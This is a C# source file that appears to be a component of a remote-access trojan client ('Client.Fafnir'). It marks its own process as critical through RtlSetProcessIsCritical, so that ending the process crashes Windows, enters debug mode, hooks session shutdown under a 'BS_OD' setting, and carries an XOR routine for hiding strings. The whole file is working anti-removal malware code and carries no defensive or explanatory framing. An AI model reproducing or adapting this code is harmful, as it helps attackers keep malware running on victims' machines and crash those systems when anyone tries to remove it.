using System;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Client.Fafnir;

public static class ProcessCritical
{
	public static void Run()
	{
		bool isRunning = false;
		Task.Factory.StartNew(() =>
		{
			while (true)
			{
				try
				{
					if (!isRunning)
					{
						Ragnar.RagnarRock();
						isRunning = true;
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine("Error encountered: " + ex.Message);
					isRunning = false;
				}
			}
		});
	}

	private static string ragnar(string str)
	{
		char c = '\n';
		StringBuilder stringBuilder = new StringBuilder();
		char[] array = str.ToCharArray();
		for (int i = 0; i < array.Length; i++)
		{
			char value = (char)(array[i] ^ c);
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
	{
		if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin())
		{
			Exit();
		}
	}

	public static void Set()
	{
		try
		{
			SystemEvents.SessionEnding += SystemEvents_SessionEnding;
			Process.EnterDebugMode();
			NativeMethods.RtlSetProcessIsCritical(1u, 0u, 0u);
		}
		catch
		{
		}
	}

	public static void Exit()
	{
		try
		{
			NativeMethods.RtlSetProcessIsCritical(0u, 0u, 0u);
		}
		catch
		{
			while (true)
			{
				Thread.Sleep(100000);
			}
		}
	}
}
